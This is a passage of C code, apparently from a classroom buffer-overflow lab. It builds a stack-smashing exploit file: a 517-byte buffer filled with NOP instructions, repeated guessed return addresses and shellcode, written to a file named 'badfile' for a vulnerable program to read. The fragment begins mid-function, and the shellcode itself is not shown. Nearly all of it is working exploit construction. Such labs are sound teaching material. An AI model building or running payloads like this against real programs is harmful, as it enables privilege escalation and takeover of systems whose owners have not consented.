char buffer[517];
    FILE *badfile;
    char *ptr;
    long *a_ptr,ret;

    int offset = DEFAULT_OFFSET;
    int codeSize = sizeof(shellcode);
    int buffSize = sizeof(buffer);

    if(argc > 1) offset = atoi(argv[1]); //allows for command line input

    ptr=buffer;
    a_ptr = (long *) ptr;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, buffSize);

//----------------------BEGIN FILL BUFFER----------------------\\

    ret = get_sp()+offset;
    // printf("Return Address: 0x%x\n",get_sp());
    // printf("Address: 0x%x\n",ret);

    ptr = buffer;
    a_ptr = (long *) ptr;

    int i;
    for (i = 0; i < 300;i+=4)
    *(a_ptr++) = ret;

    for(i = 486;i < codeSize + 486;++i)
    buffer[i] = shellcode[i-486];

    buffer[buffSize - 1] = '\0';
//-----------------------END FILL BUFFER-----------------------\\


/* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);    
}
